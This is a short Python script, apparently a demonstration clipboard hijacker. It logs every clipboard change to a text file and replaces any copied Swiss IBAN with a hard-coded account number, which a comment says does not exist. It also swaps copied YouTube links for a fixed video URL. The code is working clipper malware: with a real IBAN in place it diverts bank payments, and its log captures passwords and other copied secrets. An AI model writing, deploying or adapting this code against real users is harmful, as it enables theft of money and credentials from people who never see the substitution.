import pyperclip, re
from datetime import datetime

def log(logfile, daten):
    with open(logfile, "a") as datei:
        t = datetime.now()
        datei.write(f"{t.strftime('%m/%d/%y,%H:%M:%S')}-{daten}\n")

def mod_iban():
    #Diese IBAN existiert nicht!
    fake_iban = "CH9300762011623852957"
    pyperclip.copy(fake_iban)

def fake_url():
    fake_url = "https://www.youtube.com/watch?v=xvFZjo5PgG0"
    pyperclip.copy(fake_url)

if __name__ == "__main__":
    logfile = "logfile.txt"
    clipboard_kopie = pyperclip.paste()
    while True:
        daten = pyperclip.paste()
        if daten != "None" and daten != clipboard_kopie:
            log(logfile, daten)
            clipboard_kopie = pyperclip.paste()
            if re.match("CH[0-9]{21}", daten):
                mod_iban()
            elif "www.youtube.com" in daten:
                fake_url()